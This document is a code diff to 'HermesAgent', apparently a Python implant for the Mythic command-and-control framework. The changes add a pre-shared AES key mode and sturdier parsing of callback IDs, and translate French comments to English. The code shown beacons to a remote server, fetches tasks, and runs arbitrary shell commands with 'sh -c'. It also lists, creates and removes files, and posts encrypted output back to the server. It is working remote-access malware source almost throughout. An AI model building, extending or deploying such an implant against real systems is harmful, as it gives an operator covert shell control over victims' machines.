@@ -23,6 +23,8 @@ CONFIG_HEADERS_JSON = "CONFIG_HEADERS_JSON"
 CONFIG_INTERVAL = "CONFIG_INTERVAL"
 CONFIG_JITTER = "CONFIG_JITTER"
 CONFIG_KILLDATE = "CONFIG_KILLDATE"
+CONFIG_USE_PSK = "false"
+CONFIG_AESPSK = ""
 
 # Crypto: cryptography (pip install cryptography)
 import hashlib
@@ -166,6 +168,8 @@ class HermesAgent:
 
     def _id_bytes(self):
         id_str = self.mythic_id if self.mythic_id else self.payload_uuid
+        if not isinstance(id_str, str):
+            id_str = str(id_str)
         return (id_str.encode("utf-8") + b"\x00" * 36)[:36]
 
     def _send(self, body_json_bytes, encrypt=True):
@@ -175,7 +179,7 @@ class HermesAgent:
             body_enc = body_json_bytes
         payload = self._id_bytes() + body_enc
         b64 = base64.b64encode(payload).decode("ascii")
-        # Construire l'URL correctement : base_url se termine par /, post_uri ne commence pas par /
+        # Build URL: base_url ends with /, post_uri does not start with /
         url = self.base_url.rstrip("/") + "/" + self.post_uri.lstrip("/")
         try:
             r = _http_post(url, b64.encode("utf-8"), self.headers)
@@ -222,7 +226,18 @@ class HermesAgent:
         return True
 
     def checkin(self):
-        if not self.aes_key and not self._negotiate_key():
+        # AESPSK mode: pre-shared key injected at build time, no EKE
+        use_psk = (CONFIG_USE_PSK or "").strip().lower() in ("true", "1", "yes")
+        if use_psk and (CONFIG_AESPSK or "").strip():
+            try:
+                self.aes_key = base64.b64decode((CONFIG_AESPSK or "").strip())
+                if len(self.aes_key) != 32:
+                    self.aes_key = None
+            except Exception:
+                self.aes_key = None
+            if not self.aes_key:
+                return False
+        elif not self.aes_key and not self._negotiate_key():
             return False
         ips = get_ips()
         msg = {
@@ -249,13 +264,26 @@ class HermesAgent:
             data = json.loads(resp.decode("utf-8"))
         except Exception:
             return False
-        if data.get("status") == "success" and data.get("id"):
-            self.mythic_id = data["id"]
+        if data.get("status") != "success":
+            return False
+        # Callback ID for subsequent messages (get_tasking, post_response).
+        # Mythic may return "id", "agent_callback_id" or "uuid", sometimes in a nested object.
+        inner = data.get("message") if isinstance(data.get("message"), dict) else {}
+        callback_id = (
+            data.get("id")
+            or data.get("agent_callback_id")
+            or data.get("uuid")
+            or inner.get("id")
+            or inner.get("agent_callback_id")
+            or inner.get("uuid")
+        )
+        if callback_id is not None:
+            self.mythic_id = str(callback_id)
             return True
         return False
 
     def get_tasking(self, responses):
-        # Utiliser -1 pour demander toutes les tâches disponibles (comme Poseidon)
+        # Use -1 to request all available tasks (like Poseidon)
         msg = {
             "action": "get_tasking",
             "tasking_size": -1,
@@ -271,29 +299,25 @@ class HermesAgent:
             return None
 
     def _get_param(self, params, key, default=""):
-        """Helper pour extraire un paramètre, même s'il est dans un dict imbriqué"""
+        """Extract a parameter value, even when nested in a dict."""
         if not isinstance(params, dict):
             return default
         
         value = params.get(key, default)
         
-        # Si la valeur est un dict, essayer d'extraire la valeur réelle
+        # If value is a dict, try to extract the actual value
         if isinstance(value, dict):
-            # Si le dict contient la même clé, prendre cette valeur (récursif)
             if key in value:
                 return self._get_param(value, key, default)
-            # Sinon, prendre la première valeur string du dict
             for v in value.values():
                 if isinstance(v, str) and v:
                     return v
-            # Si aucune string trouvée, essayer de convertir le dict en string (pour debug)
             return default
         
-        # Si c'est déjà une string, la retourner
         if isinstance(value, str):
             return value
         
-        # Si c'est un autre type (int, bool, etc.), le convertir en string
+        # Convert other types (int, bool, etc.) to string
         if value:
             return str(value)
         
@@ -303,16 +327,12 @@ class HermesAgent:
         task_id = task.get("id", "")
         cmd = task.get("command", "")
         params_str = task.get("parameters", "{}")
-        
-        # Parsing amélioré des paramètres
         params = {}
         try:
             if isinstance(params_str, str):
-                # Si c'est une string, essayer de la parser en JSON
                 if params_str.strip():
                     try:
                         params = json.loads(params_str)
-                        # Si params contient des valeurs qui sont elles-mêmes des strings JSON, les parser aussi
                         for k, v in params.items():
                             if isinstance(v, str) and v.strip().startswith("{") and v.strip().endswith("}"):
                                 try:
@@ -320,15 +340,12 @@ class HermesAgent:
                                 except:
                                     pass
                     except json.JSONDecodeError:
-                        # Si ce n'est pas du JSON valide, peut-être que c'est une commande shell directe
-                        # On garde params vide et on utilisera params_str directement pour shell
+                        # Not valid JSON; may be raw shell command
                         params = {}
                 else:
                     params = {}
             elif isinstance(params_str, dict):
-                # Si c'est déjà un dict, l'utiliser directement
                 params = params_str.copy()
-                # Parser récursivement les valeurs qui sont des strings JSON
                 for k, v in params.items():
                     if isinstance(v, str) and v.strip().startswith("{") and v.strip().endswith("}"):
                         try:
@@ -343,30 +360,21 @@ class HermesAgent:
         out = {"task_id": task_id, "user_output": "", "completed": True, "status": "success"}
         try:
             if cmd == "shell":
-                # Essayer plusieurs façons de récupérer la commande
                 c = self._get_param(params, "command", "")
-                
-                # Si params est vide ou si command n'existe pas, essayer params_str directement
                 if not c:
-                    # Peut-être que la commande est dans params_str directement (pas de JSON)
                     if isinstance(params_str, str) and params_str.strip():
-                        # Si params_str ne commence pas par {, c'est probablement la commande directe
                         if not params_str.strip().startswith("{"):
                             c = params_str.strip()
                         else:
-                            # C'est du JSON mais le parsing a échoué, essayer quand même
                             try:
                                 parsed = json.loads(params_str)
                                 c = self._get_param(parsed, "command", "")
                             except:
                                 pass
-                
-                # Vérifier qu'on a une commande valide
                 if not c:
                     out["user_output"] = f"Command parameter missing or invalid. Received params={params}, params_str={repr(params_str)}"
                     out["status"] = "error"
                 else:
-                    # Exécuter la commande
                     r = subprocess.run(["sh", "-c", c], capture_output=True, text=True, timeout=60, cwd=self._cwd or None)
                     out["user_output"] = (r.stdout or "") + (r.stderr and ("\n" + r.stderr) or "")
                     if r.returncode != 0:
@@ -379,13 +387,12 @@ class HermesAgent:
                     path = "."
                 path = os.path.join(self._cwd, path) if not os.path.isabs(path) else path
                 if os.path.isdir(path):
-                    # Format lisible comme ls -la
                     try:
                         r = subprocess.run(["ls", "-lah", path], capture_output=True, text=True, timeout=10)
                         if r.returncode == 0:
                             out["user_output"] = r.stdout
                         else:
-                            # Fallback: format manuel si ls échoue
+                            # Fallback: manual listing if ls fails
                             entries = []
                             for e in sorted(os.listdir(path)):
                                 full = os.path.join(path, e)
@@ -397,7 +404,7 @@ class HermesAgent:
                                 entries.append(f"{mode} {size:>8} {mtime} {'d' if not is_file else '-'} {e}")
                             out["user_output"] = "\n".join(entries)
                     except Exception:
-                        # Fallback: format JSON si tout échoue
+                        # Fallback: raw JSON if all else fails
                         entries = []
                         for e in sorted(os.listdir(path)):
                             full = os.path.join(path, e)
@@ -520,29 +527,28 @@ class HermesAgent:
                         out["user_output"] = f"Error removing {path}: {e}"
                         out["status"] = "error"
             elif cmd == "mkdir":
-                # Debug: voir ce qui arrive
+                # Debug: inspect incoming params
                 path = self._get_param(params, "path", "")
-                # Si path est toujours vide ou contient des accolades, essayer de parser params_str directement
                 if not path or "{" in str(path):
-                    # Peut-être que params_str contient directement le JSON
+                    # Try parsing params_str as JSON for path
                     if isinstance(params_str, str) and params_str.strip().startswith("{"):
                         try:
                             parsed = json.loads(params_str)
                             path = self._get_param(parsed, "path", "")
                         except:
                             pass
-                    # Si toujours rien, essayer de prendre params_str directement si ce n'est pas du JSON
+                    # If still empty, use params_str as path when it is not JSON
                     if not path or "{" in str(path):
                         if isinstance(params_str, str) and not params_str.strip().startswith("{"):
                             path = params_str.strip()
                 
-                # Nettoyer path: enlever les accolades et extraire la valeur si c'est du JSON mal parsé
+                # Normalize path: strip braces and extract value from malformed JSON
                 if isinstance(path, str) and path.startswith("{") and path.endswith("}"):
                     try:
                         parsed = json.loads(path)
                         path = self._get_param(parsed, "path", "")
                     except:
-                        # Si le parsing échoue, essayer d'extraire manuellement
+                        # If parsing fails, try manual extraction
                         import re
                         match = re.search(r'"path"\s*:\s*"([^"]+)"', path)
                         if match:
